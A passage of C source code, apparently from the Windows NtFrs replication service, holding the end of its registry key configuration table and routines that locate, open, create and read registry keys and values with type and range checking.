            FKC_ACCESS_CHK_IS_PATH_REPLICATED_ENABLE,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\Is Path Replicated\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_IS_PATH_REPLICATED,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_READ,
            FKC_ACCESS_CHK_IS_PATH_REPLICATED_RIGHTS,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


#define  FRS_RKEY_ACCCHK_WRITER_COMMANDS  \
    FRS_CONFIG_SECTION  L",Access Checks,"  ACK_WRITER_COMMANDS

    // Access Checks\Writer Commands\Access checks are [Enabled or Disabled]
    {FRS_RKEY_ACCCHK_WRITER_COMMANDS,   ACCESS_CHECKS_ARE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_ARE_DEFAULT_ENABLED,
            FKC_ACCESS_CHK_WRITER_COMMANDS_ENABLE,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},


    // Access Checks\Writer Commands\Access checks require [Full Control or Read]
    {FRS_RKEY_ACCCHK_WRITER_COMMANDS,   ACCESS_CHECKS_REQUIRE,       UNITS_NONE,
        REG_SZ,      DT_ACCESS_CHK,   2, 200, 0, EVENT_FRS_BAD_REG_DATA,
        ACCESS_CHECKS_REQUIRE_DEFAULT_WRITE,
            FKC_ACCESS_CHK_WRITER_COMMANDS_RIGHTS,  FRS_RKF_READ_AT_START         |
                                            FRS_RKF_LOG_EVENT             |
                                            FRS_RKF_CREATE_KEY            |
                                            FRS_RKF_SYNTAX_CHECK          |
                                            FRS_RKF_RANGE_CHECK},



 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **       F R S   B a c k u p   /   R e s t o r e   R e l a t e d   K e y s   **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/


    //
    // No event log messages are generated for these keys since currently
    // they are only created by the service or NTFRSAPI so if they get
    // fouled up there is nothing the USER can do to correct the problem.
    //

#define FRS_RKEY_BACKUP_STARTUP_SET_N_SECTION   FRS_BACKUP_RESTORE_MV_SETS_SECTION L",ARG1"

/*
Used in NtfrsApi.c to pass to backup/restore.

#define FRS_NEW_FILES_NOT_TO_BACKUP L"SYSTEM\\CurrentControlSet\\Control\\BackupRestore\\FilesNotToBackup"
FRS_NEW_FILES_NOT_TO_BACKUP    REG_MULTI_SZ key


#define FRS_OLD_FILES_NOT_TO_BACKUP L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FilesNotToBackup"
FRS_OLD_FILES_NOT_TO_BACKUP    REG_MULTI_SZ key

*/


    // Backup/Restore
    //     *NOTE* THis is a key only.  It has no value.
    {FRS_BACKUP_RESTORE_SECTION,    L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_BKUP_SECTION_KEY,                0},


    // Backup/Restore\\Stop NtFrs from Starting
    //     *NOTE* THis is a key only.  It has no value.
    {FRS_BACKUP_RESTORE_STOP_SECTION,    L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_BKUP_STOP_SECTION_KEY,           0},


    // Backup/Restore\Process at Startup\Replica Sets
    //     *NOTE* THis is a key only.  It has no value.
    {FRS_BACKUP_RESTORE_MV_SETS_SECTION,       L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_BKUP_MV_SETS_SECTION_KEY,           0},


    // Backup/Restore\Process at Startup\Cumulative Replica Sets
    //     *NOTE* THis is a key only.  It has no value.
    {FRS_BACKUP_RESTORE_MV_CUMULATIVE_SETS_SECTION,   L"*KeyOnly*",  UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_BKUP_MV_CUMSETS_SECTION_KEY,           0},


    // Global Backup / Restore flags.
    // backup/restore\Process at Startup\BurFlags
    {FRS_BACKUP_RESTORE_MV_SECTION,  FRS_VALUE_BURFLAGS,       UNITS_NONE,
        REG_DWORD, DT_ULONG, 0, MAXLONG, NTFRSAPI_BUR_FLAGS_NONE, EVENT_FRS_NONE, NULL,
            FKC_BKUP_STARTUP_GLOBAL_BURFLAGS,   FRS_RKF_READ_AT_START      |
                                                FRS_RKF_OK_TO_USE_DEFAULT},


    // Backup / Restore flags for this replica set in "Process at Startup"
    // backup/restore\Process at Startup\Replica Sets\<guid>\BurFlags
    {FRS_RKEY_BACKUP_STARTUP_SET_N_SECTION,  FRS_VALUE_BURFLAGS, UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_BKUP_STARTUP_SET_N_BURFLAGS,     FRS_RKF_READ_AT_START},



 /******************************************************************************
 *******************************************************************************
 **                                                                           **
 **               F R S   P E R F M O N   R e l a t e d   K e y s             **
 **                                                                           **
 **                                                                           **
 *******************************************************************************
 ******************************************************************************/

    //
    // No event log messages are generated for these keys since currently
    // they are only created by the service so if they get
    // fouled up there is nothing the USER can do to correct the problem.
    //

    //
    // Note: We can't really use thes yet since some of them are in the DLL
    // which doesn't link with this module.  Also some are MULTI_SZ which
    // needs more work in CfgRegReadString and writestring.

#define FRS_RKEY_REPLICA_SET_PERFMON  \
    L"SYSTEM\\CurrentControlSet\\Services\\FileReplicaSet\\Performance"

#define FRS_RKEY_REPLICA_SET_PERF_LINKAGE  \
    L"SYSTEM\\CurrentControlSet\\Services\\FileReplicaSet\\Linkage"

#define FRS_RKEY_CXTION_PERFMON  \
    L"SYSTEM\\CurrentControlSet\\Services\\FileReplicaConn\\Performance"


#define FRS_RKEY_CXTION_PERF_LINKAGE  \
    L"SYSTEM\\CurrentControlSet\\Services\\FileReplicaConn\\Linkage"



    // FileReplicaSet\\Performance\First Counter
    {FRS_RKEY_REPLICA_SET_PERFMON,       L"First Counter",       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_SET_FIRST_CTR,        FRS_RKF_READ_AT_START},


    // FileReplicaSet\\Performance\First Help
    {FRS_RKEY_REPLICA_SET_PERFMON,       L"First Help",       UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_SET_FIRST_HELP,        FRS_RKF_READ_AT_START},


    // FileReplicaSet\\Linkage\Export
    {FRS_RKEY_REPLICA_SET_PERF_LINKAGE,   L"Export",       UNITS_NONE,
        REG_MULTI_SZ,    DT_UNICODE,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_SET_LINKAGE_EXPORT,    FRS_RKF_READ_AT_START},


    // FileReplicaConn\\Performance\First Counter
    {FRS_RKEY_CXTION_PERFMON,         L"First Counter",      UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_CXTION_FIRST_CTR,        FRS_RKF_READ_AT_START},


    // FileReplicaConn\\Performance\First Help
    {FRS_RKEY_CXTION_PERFMON,         L"First Help",      UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_CXTION_FIRST_HELP,        FRS_RKF_READ_AT_START},

    // FileReplicaConn\\Linkage\Export
    {FRS_RKEY_CXTION_PERF_LINKAGE,    L"Export",       UNITS_NONE,
        REG_MULTI_SZ,    DT_UNICODE,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPLICA_CXTION_LINKAGE_EXPORT,    FRS_RKF_READ_AT_START},




#define  FRS_RKEY_REPARSE_TAG  \
    FRS_REPARSE_TAG_SECTION  L",ARG1"

    // Reparse Tag Section        *NOTE* THis is a key only.  It has no value.
    {FRS_REPARSE_TAG_SECTION,         L"*KeyOnly*",       UNITS_NONE,
        REG_SZ,      DT_UNICODE,   2, 10*1024, 0, EVENT_FRS_NONE, NULL,
            FKC_REPARSE_TAG_KEY,                               0},

    //
    {FRS_RKEY_REPARSE_TAG,         L"Reparse Tag Type",      UNITS_NONE,
        REG_DWORD,      DT_ULONG,   0, MAXLONG, 0, EVENT_FRS_NONE, NULL,
            FKC_REPARSE_TAG_TYPE,        FRS_RKF_READ_AT_START},

    {FRS_RKEY_REPARSE_TAG,         L"Data to Replicate [None or File Data or Reparse Point]",      UNITS_NONE,
        REG_SZ, DT_UNICODE, 0, 0, 0, EVENT_FRS_NONE, NULL,
            FKC_REPARSE_TAG_REPLICATION_TYPE,        FRS_RKF_READ_AT_START},


    {L"End of table",           NULL,                      UNITS_NONE,
        REG_SZ,      DT_UNSPECIFIED,   0,  0, 0,           EVENT_FRS_NONE, NULL,
            FKC_END_OF_TABLE,           0}


};  // End of FrsRegistryKeyTable



PFRS_REGISTRY_KEY
FrsRegFindKeyContext(
    IN  FRS_REG_KEY_CODE KeyIndex
)
{
/*++

Routine Description:

    This function takes an FRS Registry Key code and returns a pointer to
    the associated key context data.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

Return Value:

    Ptr to the matching Key context entry or NULL if not found.

--*/
#undef DEBSUB
#define  DEBSUB  "FrsRegFindKeyContext:"

    PFRS_REGISTRY_KEY KeyCtx;

//DPRINT(0, "function entry\n");

    FRS_ASSERT((KeyIndex > 0) && (KeyIndex < FRS_REG_KEY_CODE_MAX));

    if (KeyIndex >= FRS_REG_KEY_CODE_MAX) {
        return NULL;
    }

    KeyCtx = FrsRegistryKeyTable;


    while (KeyCtx->FrsKeyCode > FKC_END_OF_TABLE) {
        if (KeyIndex == KeyCtx->FrsKeyCode) {
            //
            // Found it.
            //
            return KeyCtx;
        }
        KeyCtx += 1;
    }

    //
    // Not found.
    //
    return NULL;

}





PWCHAR
CfgRegGetValueName(
    IN  FRS_REG_KEY_CODE KeyIndex
)
{
/*++

Routine Description:

    This function returns a ptr to the value name string in the key context.
    This is NOT a ptr to an allocated string so it should NOT be freed.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum


Return Value:

    Ptr to value name string.  NULL if KeyIndex lookup fails.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegGetValueName:"


    PFRS_REGISTRY_KEY KeyCtx;

    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return L"<null>";
    }

    return KeyCtx->ValueName;

}


DWORD
FrsRegExpandKeyStr(
    IN  PFRS_REGISTRY_KEY Kc,
    IN  PWCHAR            KeyArg1,
    IN  ULONG             Flags,
    OUT PWCHAR            *FullKeyStr
)
{
/*++

Routine Description:

    This function only expands a key field in the given KeyContext and
    returns the result in FullKeyStr.  This is used primarily for error
    messages but is also used to open registry access check keys.

    The syntax for the the key field in the KeyContext consists of multiple
    key components separated by commas.  This function splits the key field on
    the commas.  It then opens the leading key followed by either a create or
    open of each successive component.  If a component matches the string
    L"ARG1" then we substitute the KeyArg1 parameter passed to this function
    for this key component.  Most often this is a stringized guid.  For
    example, the string FRS_RKEY_SET_N is defined as:

    FRS_CONFIG_SECTION L",Replica Sets,ARG1"

    This will end up opening/creating the following key:

    "System\\CurrentControlSet\\Services\\NtFrs\\Parameters\\
        Replica Sets\\
            27d6d1c4-d6b8-480b-9f18b5ea390a0178"

    assuming the argument passed in was "27d6d1c4-d6b8-480b-9f18b5ea390a0178".

Arguments:

    Kc   - A ptr to the key context struct for the desired reg key.

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags

    FullKeyStr - ptr to return buffer for expanded key string.
        NOTE:  The buffer is allocated here.  Caller must free it.

Return Value:

    Win32 status of the result of the operation.
    FullKeyStr is returned NULL if operation fails.

--*/
#undef DEBSUB
#define  DEBSUB  "FrsRegExpandKeyStr:"

    UNICODE_STRING TempUStr, FirstArg;

    PWCHAR FullKey = NULL;
    ULONG  Len, FullKeyLen;
    WCHAR  KeyStr[MAX_PATH];


//DPRINT(0, "function entry\n");

    *FullKeyStr = NULL;


    FullKey = FrsAlloc(FULL_KEY_BUFF_SIZE*sizeof(WCHAR));
    FullKey[0] = UNICODE_NULL;
    FullKeyLen = 1;

    //
    // If there are any commas in this key then we need to do a nested
    // key open (perhaps creating nested keys as we go).  If the key
    // component matches the string L"ARG1" then we use KeyArg1 supplied by
    // the caller.
    //
    RtlInitUnicodeString(&TempUStr, Kc->KeyName);

    //
    // Parse the comma list.
    //
    while (FrsDissectCommaList(TempUStr, &FirstArg, &TempUStr)) {

        if ((FirstArg.Length == 0) || (FirstArg.Length >= sizeof(KeyStr))) {
            DPRINT1(0, ":FK: ERROR - Bad keyName in Key contxt %ws\n", Kc->KeyName);
            goto ERROR_RETURN;
        }

        //
        // null terminate the key component string.
        //
        CopyMemory(KeyStr, FirstArg.Buffer, FirstArg.Length);
        KeyStr[FirstArg.Length/sizeof(WCHAR)] = UNICODE_NULL;

        //
        // Check the Key Component for a match on ARG1 and substitute.
        //
        if (wcscmp(KeyStr, L"ARG1") == 0) {

            if (wcslen(KeyArg1)*sizeof(WCHAR) > sizeof(KeyStr)) {
                DPRINT1(0, ":FK: ERROR - ARG1 too big %ws\n", KeyArg1);
                goto ERROR_RETURN;
            }
            wcscpy(KeyStr, KeyArg1);
        }

        Len = wcslen(KeyStr);
        if (FullKeyLen + Len + 1 > FULL_KEY_BUFF_SIZE) {
            goto ERROR_RETURN;
        }

        if (FullKeyLen > 1) {
            wcscat(FullKey, L"\\");
            FullKeyLen += 1;
        }

        wcscat(FullKey, KeyStr);
        FullKeyLen += Len;

    }   // end while()


    if (FullKeyLen <= 1) {
        goto ERROR_RETURN;
    }

    DPRINT1(4, ":FK: Expanded key name is \"%ws\"\n", FullKey);

    //
    // Return the expanded key to the caller.
    //
    *FullKeyStr = FullKey;

    return ERROR_SUCCESS;


ERROR_RETURN:

    DPRINT1(0, ":FK: ERROR - FrsRegExpandKeyStr Failed on %ws", Kc->KeyName);

    FrsFree(FullKey);

    return ERROR_INVALID_PARAMETER;

}

DWORD
FrsRegOpenKey(
    IN  PFRS_REGISTRY_KEY Kc,
    IN  PWCHAR            KeyArg1,
    IN  ULONG             Flags,
    OUT PHKEY             hKeyRet
)
{
/*++

Routine Description:

    This function opens a registry key and returns a handle.

    See FrsRegExpandKeyStr() for a description of the key field syntax.

Arguments:

    Kc   - A ptr to the key context struct for the desired reg key.

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags
            FRS_RKF_KEY_ACCCHK_READ means only do a read access check on the key.
            FRS_RKF_KEY_ACCCHK_WRITE means only do a KEY_ALL_ACCESS access check on the key.

            if FRS_RKF_CREATE_KEY is set and FRS_RKF_KEY_MUST_BE_PRESENT is clear
            and the given key component is not found, this function creates it.

    hKeyRet - ptr to HKEY for returned key handle.

Return Value:

    Win32 status of the result of the registry operation.
    hKeyRet is returned only on a success.

--*/
#undef DEBSUB
#define  DEBSUB  "FrsRegOpenKey:"

    UNICODE_STRING TempUStr, FirstArg;
    ULONG  WStatus;
    PWCHAR FullKey = NULL;

    HKEY   hKey = HKEY_LOCAL_MACHINE;
    HKEY   hKeyParent = INVALID_HANDLE_VALUE;

    ULONG  AccessRights;
    PCHAR  AccessName;
    WCHAR  KeyStr[MAX_PATH];



    FrsFlagsToStr(Flags, RkfFlagNameTable, sizeof(KeyStr), (PCHAR)KeyStr);
    DPRINT2(4, ":FK: %ws Caller Flags [%s]\n", Kc->ValueName, (PCHAR)KeyStr);
    FrsFlagsToStr(Kc->Flags, RkfFlagNameTable, sizeof(KeyStr), (PCHAR)KeyStr);
    DPRINT2(4, ":FK: %ws KeyCtx Flags [%s]\n", Kc->ValueName, (PCHAR)KeyStr);

//DPRINT(0, "function entry\n");

    //
    // If this is a call to make a read or write access check then we must
    // first build the entire key string and then try the open.  The
    // caller has done an impersonation.
    //
    if (BooleanFlagOn(Flags | Kc->Flags, FRS_RKF_KEY_ACCCHK_READ |
                                         FRS_RKF_KEY_ACCCHK_WRITE)) {

        AccessRights = KEY_READ;
        AccessName = "KEY_READ";

        if (BooleanFlagOn(Flags | Kc->Flags, FRS_RKF_KEY_ACCCHK_WRITE)) {
            AccessRights = KEY_ALL_ACCESS;
            AccessName = "KEY_ALL_ACCESS";
        }

        //
        // Expand the key string.
        //
        FrsRegExpandKeyStr(Kc, KeyArg1, Flags, &FullKey);
        if (FullKey == NULL) {
            return ERROR_INVALID_PARAMETER;
        }

        DPRINT2(4, ":FK: Doing Access Check (%s) on key \"%ws\"\n",
                AccessName, FullKey);

        WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, FullKey, 0, AccessRights, &hKey);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT1_WS(0, ":FK: ERROR - Access Check failed on %ws;", FullKey, WStatus);
            FrsFree(FullKey);
            return WStatus;
        }

        //
        // Return the key handle to the caller.
        //
        *hKeyRet = hKey;

        FrsFree(FullKey);
        return ERROR_SUCCESS;
    }

    //
    // Not a key access check.  Do normal key open processing.
    //

    //
    // If there are any commas in this key then we need to do a nested
    // key open (perhaps creating nested keys as we go).  If the key
    // component matches the string L"ARG1" then we use KeyArg1 supplied by
    // the caller.
    //
    RtlInitUnicodeString(&TempUStr, Kc->KeyName);

    //
    // Parse the comma list.
    //
    while (FrsDissectCommaList(TempUStr, &FirstArg, &TempUStr)) {

        if ((FirstArg.Length == 0) || (FirstArg.Length >= sizeof(KeyStr))) {
            DPRINT1(0, ":FK: ERROR - Bad keyName in Key contxt %ws\n", Kc->KeyName);
            WStatus = ERROR_INVALID_PARAMETER;
            goto RETURN;
        }

        //
        // null terminate the key component string.
        //
        CopyMemory(KeyStr, FirstArg.Buffer, FirstArg.Length);
        KeyStr[FirstArg.Length/sizeof(WCHAR)] = UNICODE_NULL;

        hKeyParent = hKey;
        hKey = INVALID_HANDLE_VALUE;

        //
        // Check the Key Component for a match on ARG1 and substitute.
        //
        if (wcscmp(KeyStr, L"ARG1") == 0) {

            if (wcslen(KeyArg1)*sizeof(WCHAR) > sizeof(KeyStr)) {
                DPRINT1(0, ":FK: ERROR - ARG1 too big %ws\n", KeyArg1);
                WStatus = ERROR_INVALID_PARAMETER;
                goto RETURN;
            }
            wcscpy(KeyStr, KeyArg1);
        }

        //
        // Open the next key component.
        //
        DPRINT1(5, ":FK: Opening next key component [%ws]\n", KeyStr);
        WStatus = RegOpenKeyEx(hKeyParent, KeyStr, 0, KEY_ALL_ACCESS, &hKey);
        if (!WIN_SUCCESS(WStatus)) {

            //
            // If the key is supposed to be there then return error to caller.
            //
            if (BooleanFlagOn(Flags | Kc->Flags, FRS_RKF_KEY_MUST_BE_PRESENT)) {
                DPRINT1_WS(0, ":FK: Could not open key component [%ws].", KeyStr, WStatus);

                FrsRegPostEventLog(Kc, KeyArg1, Flags, IDS_REG_KEY_NOT_FOUND);
                goto RETURN;
            }

            if (BooleanFlagOn(Flags | Kc->Flags, FRS_RKF_CREATE_KEY)) {
                //
                // Try to create the key.
                //
                DPRINT1(4, ":FK: Creating key component [%ws]\n", KeyStr);
                WStatus = RegCreateKeyW(hKeyParent, KeyStr, &hKey);
                CLEANUP1_WS(0, ":FK: Could not create key component [%ws].",
                            KeyStr, WStatus, RETURN);
            } else {
                //
                // Key not there and not supposed to create it.  Let caller know.
                //
                goto RETURN;
            }
        }


        if (hKeyParent != HKEY_LOCAL_MACHINE) {
            FRS_REG_CLOSE(hKeyParent);
        }
    }   // end while()



    //
    // Return the key handle to the caller.
    //
    *hKeyRet = hKey;
    WStatus = ERROR_SUCCESS;


RETURN:

    if (hKeyParent != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKeyParent);
    }

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(5, "ERROR - FrsRegOpenKey Failed.", WStatus);

        if (hKey != HKEY_LOCAL_MACHINE) {
            FRS_REG_CLOSE(hKey);
        }
    }


    return WStatus;

}



DWORD
CfgRegReadDWord(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    OUT PULONG           DataRet
)
{
/*++

Routine Description:

    This function reads a keyword value from the registry.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags

    DataRet - ptr to DWORD for returned result.

Return Value:

    Win32 status of the result of the registry operation.
    Data is returned only on a success.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegReadDWord:"


    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    DWORD   Type;
    DWORD   Len;
    DWORD   Data;
    BOOL    DefaultValueUseOk;
    PFRS_REGISTRY_KEY KeyCtx;

//DPRINT(0, "function entry\n");

    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return ERROR_INVALID_PARAMETER;
    }


    DefaultValueUseOk = BooleanFlagOn(Flags | KeyCtx->Flags,
                                      FRS_RKF_OK_TO_USE_DEFAULT);

    FRS_ASSERT(KeyCtx->ValueName != NULL);

    DPRINT2(4, ":FK: Reading parameter [%ws] \"%ws\" \n",
            KeyCtx->KeyName, KeyCtx->ValueName);


    //
    // Table entry better be REG_DWORD.
    //
    if  (KeyCtx->RegValueType != REG_DWORD) {
        DPRINT3(4, ":FK: Mismatch on KeyCtx->RegValueType for [%ws] \"%ws\".  Expected REG_DWORD, Found type: %d\n",
             KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->RegValueType);

        FRS_ASSERT(!"Mismatch on KeyCtx->RegValueType, Expected REG_DWORD");
        return ERROR_INVALID_PARAMETER;
    }

    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);

    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }

    //
    // Read the value
    //
    Len = sizeof(Data);
    Type = REG_DWORD;
    WStatus = RegQueryValueEx(hKey, KeyCtx->ValueName, NULL, &Type, (PUCHAR)&Data, &Len);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(5, "ERROR - RegQueryValueEx Failed.", WStatus);

        if (WStatus == ERROR_FILE_NOT_FOUND) {
            //
            // If the value is supposed to be there then return error to caller.
            //
            if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_VALUE_MUST_BE_PRESENT)) {
                DPRINT2_WS(0, ":FK: Value not found  [%ws] \"%ws\".",
                           KeyCtx->KeyName, KeyCtx->ValueName, WStatus);
                FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_NOT_FOUND);
                goto RETURN;
            }
        } else {
            //
            // Check for expected registry datatype if we found a value.
            // Check for buffer size OK.  4 bytes for DWORDs.
            //
            if (WIN_BUF_TOO_SMALL(WStatus) || (Type != REG_DWORD)) {
                DPRINT4(0, ":FK: Invalid registry data type for [%ws] \"%ws\".  Found Type %d, Expecting Type %d\n",
                        KeyCtx->KeyName, KeyCtx->ValueName, Type, REG_DWORD);
                FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_WRONG_TYPE);
            }
        }

        WStatus = ERROR_INVALID_PARAMETER;
    } else {

        //
        // Found a value, Check type.  If wrong, use default.
        //
        if (Type != REG_DWORD) {
            DPRINT4(0, ":FK: Invalid registry data type for [%ws] \"%ws\".  Found Type %d, Expecting Type %d\n",
                    KeyCtx->KeyName, KeyCtx->ValueName, Type, REG_DWORD);
            FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_WRONG_TYPE);
            WStatus = ERROR_INVALID_PARAMETER;
        }
    }


    if (!WIN_SUCCESS(WStatus) && DefaultValueUseOk) {
        //
        // Not found or wrong type but Ok to use the default value from key context.
        //
        Type = KeyCtx->RegValueType;
        Data = KeyCtx->ValueDefault;
        WStatus = ERROR_SUCCESS;
        DPRINT2(4, ":FK: Using internal default value for [%ws] \"%ws\".\n",
                KeyCtx->KeyName, KeyCtx->ValueName);
        //
        // Only use it once though.
        //
        DefaultValueUseOk = FALSE;
    }


    if (WIN_SUCCESS(WStatus)) {
        //
        // Perform syntax check based on data type in KeyCtx->DataValueType?
        //
        if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_SYNTAX_CHECK)) {
            NOTHING;
        }

        //
        // Perform Range check?    (Applies to default value too)
        //
        if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_RANGE_CHECK)) {


            if ((Data < KeyCtx->ValueMin) || ( Data > KeyCtx->ValueMax)) {

                DPRINT5(0, ":FK: Value out of range for [%ws] \"%ws\".  Found %d, must be between %d and %d\n",
                        KeyCtx->KeyName, KeyCtx->ValueName, Data,
                        KeyCtx->ValueMin, KeyCtx->ValueMax);

                FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_RANGE_ERROR);

                if (DefaultValueUseOk) {
                    //
                    // out of range but Ok to use the default value from key context.
                    //
                    DPRINT2(4, ":FK: Using internal default value for [%ws] \"%ws\".\n",
                            KeyCtx->KeyName, KeyCtx->ValueName);
                    Type = KeyCtx->RegValueType;
                    Data = KeyCtx->ValueDefault;
                    WStatus = ERROR_SUCCESS;

                    //
                    // Recheck the range.
                    //
                    if ((Data < KeyCtx->ValueMin) || ( Data > KeyCtx->ValueMax)) {
                        DPRINT5(0, ":FK: Default Value out of range for [%ws] \"%ws\".  Found %d, must be between %d and %d\n",
                                KeyCtx->KeyName, KeyCtx->ValueName, Data,
                                KeyCtx->ValueMin, KeyCtx->ValueMax);
                        WStatus = ERROR_INVALID_PARAMETER;
                        goto RETURN;
                    }

                } else {
                    WStatus = ERROR_INVALID_PARAMETER;
                    goto RETURN;
                }
            }
        }

        //
        // Data valid and in range.  Return it and save it.
        //
        *DataRet = Data;

        DPRINT3(3, ":FK:   [%ws] \"%ws\" = %d\n",
                KeyCtx->KeyName, KeyCtx->ValueName, Data);
    }


RETURN:

    if (hKey != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKey);
    }

    return WStatus;

}

DWORD
CfgRegReadString(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    OUT PWSTR            *pStrRet
)
{
/*++

Routine Description:

    This function reads a keyword string value from the registry.  The return
    buffer is allocated here with FrsAlloc().  Caller must free.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags

    pStrRet - ptr to address of string buffer for returned result else NULL.

    NOTE: The return buffer is allocated here, caller must free it.

Return Value:

    Win32 status of the result of the registry operation.
    Data is returned only on a success.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegReadString:"

    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    DWORD   Type;
    DWORD   Len, NewLen;
    PWCHAR  Data, NewData;
    BOOL    DefaultValueUseOk;
    PFRS_REGISTRY_KEY KeyCtx;
    WCHAR TStr[4];

    // add support or new func for REG_MULTI_SZ?

//DPRINT(0, "function entry\n");

    Data = NULL;

    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        *pStrRet = NULL;
        return ERROR_INVALID_PARAMETER;
    }


    DefaultValueUseOk = BooleanFlagOn(Flags | KeyCtx->Flags,
                                      FRS_RKF_OK_TO_USE_DEFAULT);

    FRS_ASSERT(KeyCtx->ValueName != NULL);

    DPRINT2(4, ":FK: Reading parameter [%ws] \"%ws\" \n",
            KeyCtx->KeyName, KeyCtx->ValueName);

    //
    // Table entry better be some kind of string.
    //
    if  ((KeyCtx->RegValueType != REG_SZ) &&
         (KeyCtx->RegValueType != REG_EXPAND_SZ)) {
        DPRINT3(0, ":FK: Mismatch on KeyCtx->RegValueType for [%ws] \"%ws\".  Expected REG_SZ or REG_EXPAND_SZ, Found type: %d\n",
             KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->RegValueType);
        // don't return a null ptr since calling parameter may be wrong size.
        FRS_ASSERT(!"Mismatch on KeyCtx->RegValueType, Expected REG_SZ or REG_EXPAND_SZ");
        return ERROR_INVALID_PARAMETER;
    }

    *pStrRet = NULL;

    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);

    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }

    //
    // Get the size and type for the value.
    //
    WStatus = RegQueryValueEx(hKey, KeyCtx->ValueName, NULL, &Type, NULL, &Len);

